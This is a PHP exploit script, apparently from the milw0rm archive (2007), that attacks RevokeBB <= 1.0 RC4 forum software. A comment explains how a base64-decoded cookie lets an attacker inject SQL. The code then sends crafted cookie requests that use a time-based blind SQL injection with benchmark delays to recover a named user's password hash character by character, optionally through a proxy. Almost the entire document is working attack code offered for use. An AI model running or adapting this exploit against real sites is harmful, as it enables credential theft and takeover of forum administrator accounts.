#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
-------------------------------------------------------------
RevokeBB <= 1.0 RC4 Blind SQL Injection / Hash Retrieve Exploit

Site: http://www.revokesoft.net

by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
Thanks to rgod for the php code and Marty for the Love

-------------------------------------------------------------
";
if ($argc<5) {
echo "
Usage: php ".$argv[0]." Host Path UserName PrefiX
Host:          target server (ip/hostname)
Path:          path of revbb
UserName:      a valid username
PrefiX:        the table prefix (usually revokebb_)

Example:
php ".$argv[0]." localhost /revbb/ admin revokebb_
";
die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
/*

Vuln Explanation:

This board is very cool, and before founding this bug I was sure to use it for my forum..

Vulnerable code can be found at inc\class_users.php, line 94:

if(!$_SESSION['auth'] && isset($_COOKIE['revokebb_user']))
{
	$temp_name = explode('%%',$_COOKIE['revokebb_user']);
	$temp_name[0] = base64_decode($temp_name[0]); <--- 1
	$query = $this->db->execQuery( $this->db->sql_build('cookie_user_exists', array($temp_name[0], $temp_name[1] ) ));
	if($this->db->num_rows($query)==1)
	{
		$temp=$this->db->fetch_array($query);
		$this->login($temp_name[0], $temp_name[1], $sid, false, 0);  <--- 2
	}
	else
		setcookie('revokebb_user', '', time() - 3600);
}

With base64_decode we can easy bypass magic_quotes, and inject a very pretty username into the SQL statement,
but unfotunatly, because of point 2 we could not complete bypass the login, this is the code:

$username = htmlspecialchars($username, ENT_QUOTES);
$password = htmlspecialchars($password, ENT_QUOTES);

so what we could do is only a blind sql injection to bruteforce the hash of the admin..

---------------
| ATTENTION!! |
---------------

in the various version the cookie name change, so edit it when doing the attack..

I must name my "friend" SpiderZ on this exploit, because his advisory with an EXTREMLY
CRITICAL XSS in this board is the reason why I have analized this software to show him
what a vuln is..
*/
$host=$argv[1];
$path=$argv[2];
$uname=$argv[3];
$prefix=$argv[4];

$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$md5s[0]=0;//null
$md5s=array_merge($md5s,range(48,57)); //numbers
$md5s=array_merge($md5s,range(97,102));//a-f letters
#print_r(array_values($md5s));

$j=1;$password="";
while (!strstr($password,chr(0)))
{
for ($i=0; $i<=255; $i++)
{
if (in_array($i,$md5s))
{
  $starttime=time();
  $sql=base64_encode("69' UNION SELECT IF ((ASCII(SUBSTRING(".$prefix."users.user_password,".$j.",1))=".$i.") & 1, benchmark(200000000,CHAR(0)),0),2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1 FROM ".$prefix."users WHERE ".$prefix."users.user_nick = '$uname'/*");
  $packet ="GET ".$p."index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: rv_user=$sql%%hawk\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (eregi("The used SELECT statements have a different number of columns",$html)){echo $html; die("\nunknown query error...");}
  $endtime=time();
  echo "endtime -> ".$endtime."\r\n";
  $difftime=$endtime - $starttime;
  echo "difftime -> ".$difftime."\r\n";
  if ($difftime > 7) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(2);break;}
}
  if ($i==255) {die("Exploit failed...");}
  }
  $j++;
}
echo "

$uname Hash is:  $password";

# Coded With BH Fast Generator v0.1
?>

# milw0rm.com [2007-06-01]
